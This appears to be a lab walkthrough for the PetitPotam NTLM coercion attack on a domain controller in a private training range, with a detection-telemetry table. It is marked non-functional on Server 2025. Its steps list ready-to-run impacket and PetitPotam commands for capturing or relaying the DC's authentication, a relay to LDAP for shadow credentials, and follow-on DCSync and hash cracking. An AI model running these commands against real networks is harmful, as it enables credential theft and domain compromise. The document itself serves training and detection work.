# ~~WT#018 — PetitPotam~~

> **❌ NON-FUNCTIONAL on Server 2025.** `\PIPE\efsrpc` is blocked by default — cannot coerce authentication via MS-EFSR. Preserved for reference; use WT017 (PrinterBug) instead.

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01.cadre.local) |
| **Domain** | cadre.local |
| **Starting Credential** | None (unauthenticated) |
| **Tools Required** | PetitPotam.py, impacket-ntlmrelayx |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1187 |
| **Difficulty** | Easy |

## Prerequisites
- EFS service (MS-EFSRPC) enabled on dc01 (auto-start configured in CADRE vulns role)
- WebClient service running on dc01 (enables WebDAV relay variant)
- Network connectivity from Kali (192.168.77.41) to dc01 (192.168.77.10)
- Attacker-controlled SMB listener on Kali to capture the coerced NTLM auth

## Attack Steps

### Step 1: Start NTLM capture or relay listener
```bash
# Capture-only:
sudo impacket-smbserver -smb2support share /dev/null

# Or relay to LDAP for Shadow Credentials (see WT#021):
impacket-ntlmrelayx -t ldap://dc01.cadre.local --shadow-credentials --escalate-user ops_redcell
```

### Step 2: Run PetitPotam against dc01
```bash
python3 PetitPotam.py 192.168.77.41 dc01.cadre.local
```

### Step 3: Alternative — if WebClient is target
```bash
python3 PetitPotam.py -d 192.168.77.41 dc01.cadre.local
```

### Step 4: Verify captured NTLM authentication
Check terminal output for incoming NTLM from `dc01$` account.

## Post-Exploitation Chain
- Coerced dc01$ NetNTLM hash can be relayed to LDAP (WT#021) for Shadow Credentials → DCSync
- Combined with WebClient for WebDAV relay variant (HTTP->SMB cross-protocol relay)
- Hash can be cracked offline (mode 5600) if relay fails

## Telemetry Verification
| Source | What to look for |
|--------|-----------------|
| **Windows Security (dc01)** | Event 4662 (Object Type: `EFSRPC`), Event 5156 (outbound SMB to Kali) |
| **Sysmon (dc01)** | Event 3 (network connect to Kali:445), Event 1 (lsass.exe EFS RPC calls) |
| **Zeek (monitor)** | `smb_files.log`, `dce_rpc.log` showing EFS RPC activity |
| **Suricata (monitor)** | EFS RPC / MS-EFSRPC alerts |
| **Arkime (monitor)** | Full PCAP of EFS RPC + SMB coercion traffic |
| **Elastic / Kibana** | `logs-system.security-*`, `logs-windows.sysmon_operational-*`, `logs-zeek.smb-*` |

## Status
**CONFIGURED** — EFS service set to auto-start on all DCs. PetitPotam installed on Kali.
